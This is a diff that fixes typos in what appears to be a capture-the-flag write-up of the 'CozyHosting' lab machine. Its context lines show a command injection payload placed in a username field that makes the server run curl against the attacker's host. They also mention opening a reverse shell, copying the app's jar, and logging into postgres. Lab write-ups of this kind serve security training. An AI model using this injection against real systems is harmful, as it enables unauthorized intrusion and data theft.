@@ -1,5 +1,4 @@
-# 
-
+ 
 ![Untitled](/assets/images/cozyhosting/0.png)
 
 ## NMAP
@@ -82,11 +81,11 @@ Our user input is being inserted into a shell command. If we could escape out of
 host=127.0.0.1&username=;curl 10.10.16.10:8000;
 ```
 
-When this request gets sent. We should expect the backend shell command will be transformed to
+When this request gets sent. We should expect the backend shell command to be transformed to
 
 ![Untitled](/assets/images/cozyhosting/13.png)
 
-Let’s send up a python http server on port 8000 to see if we sucessfully injected the curl command on the server.
+Let’s set up a python http server on port 8000 to see if we sucessfully injected the curl command on the server.
 
 ![Untitled](/assets/images/cozyhosting/14.png)
 
@@ -117,7 +116,7 @@ Now we can create a reverse shell on the box.
 
 ## USER
 
-we see that we are the app user on the box. If we run `ls` we can see the jar file of the web app. Let’s move it onto your machine and extract it. After, extracting it we see two files.
+we see that we are the app user on the box. If we run `ls` we can see the jar file of the web app. Let’s move it onto our machine and extract it. After, extracting it we see two files.
 
 ![Untitled](/assets/images/cozyhosting/18.png)
 
@@ -133,7 +132,7 @@ We see that postgresql is indeed running. Let’s try logging into postgres with
 
 ![Untitled](/assets/images/cozyhosting/21.png)
 
-We get logged into the postgres database and we can see 4 databases. We are interested in the cozyhosting databse. So let’s have a look at the contents of the database.
+We get logged into the postgres database and we can see 4 databases. We are interested in the cozyhosting database. So let’s have a look at the contents of the database.
 
 ![Untitled](/assets/images/cozyhosting/22.png)
 
